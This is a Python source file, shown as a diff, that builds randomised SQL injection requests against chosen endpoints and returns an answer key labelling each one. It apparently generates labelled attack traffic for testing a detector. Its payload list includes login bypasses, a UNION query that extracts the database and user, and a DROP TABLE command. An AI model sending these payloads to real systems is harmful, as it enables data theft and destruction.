@@ -1,0 +1,58 @@
+import random
+from typing import Dict, Tuple
+
+PAYLOADS = [
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    "admin' --",
+    "' UNION SELECT 1, database(), user() --",
+    "1; DROP TABLE users",
+    "' OR 'x'='x",
+    "admin' #",
+    "' OR 1=1 LIMIT 1 --",
+    "') OR ('1'='1",
+    "admin' AND 1=1 --"
+]
+
+ENDPOINTS = [
+    "/login",
+    "/search",
+    "/product",
+    "/api/users"
+]
+
+def generate(base_url: str) -> Tuple[Dict, Dict]:
+    """
+    Generates an SQL Injection attack configuration.
+    Returns: (request_kwargs, answer_key_metadata)
+    """
+    payload = random.choice(PAYLOADS)
+    endpoint = random.choice(ENDPOINTS)
+    url = f"{base_url}{endpoint}"
+    
+    method = "GET"
+    data = None
+    params = None
+    
+    # Randomly choose between GET (query param) and POST (body)
+    if random.choice([True, False]):
+        method = "POST"
+        data = {"q": payload}
+    else:
+        params = {"id": payload}
+
+    request_kwargs = {
+        "method": method,
+        "url": url,
+        "data": data,
+        "params": params
+    }
+    
+    metadata = {
+        "type": "SQLI",
+        "endpoint": endpoint,
+        "payload": payload,
+        "method": method
+    }
+    
+    return request_kwargs, metadata
